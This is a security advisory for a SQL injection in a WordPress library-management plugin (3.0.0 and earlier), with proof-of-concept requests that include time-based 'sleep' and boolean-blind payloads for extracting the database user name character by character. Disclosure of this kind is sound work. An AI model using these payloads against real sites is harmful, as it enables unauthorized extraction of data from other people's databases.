# Library Management System <= 3.0.0 - Authenticated (Admin+) SQL Injection

### Description

[Library Management System](https://wordpress.org/plugins/library-management-system/) plugin has a parameter vulnerable to SQL Injection at `admin/class-library-management-system-admin.php`, on [line 2092](https://plugins.trac.wordpress.org/browser/library-management-system/trunk/admin/class-library-management-system-admin.php#L2092).

The parameter is `value` when you filter books by category. Since we can control variable `$filterValue` and it is being pass directly on the query, we can alter it.

It's possible there are other vulnerable queries too, not yet tested, but the process seems to be the same.

<br>

### Proof of Concept

This will return category 1:
```
module=books&filterBy=category&value=2+OR+1&action=owt_lib_handler&param=owt7_lms_data_option_filters&owt7_lms_nonce=63f97d5b29
```

This will make the database sleep:
```
module=books&filterBy=category&value=2+OR+sleep(5)&action=owt_lib_handler&param=owt7_lms_data_option_filters&owt7_lms_nonce=6802c70449
```

<br>

**Boolean Blind Payload** to dump information:

This will return true, so the first character of the username id 'd' (character for 100 in ASCII):
```
1+AND+(SELECT+ASCII(SUBSTRING((SELECT+USER()),1,1))=100)
```

Find second character (the username is 'demo' in this case):
```
1+AND+(SELECT+ASCII(SUBSTRING((SELECT+USER()),2,1))=101)
```
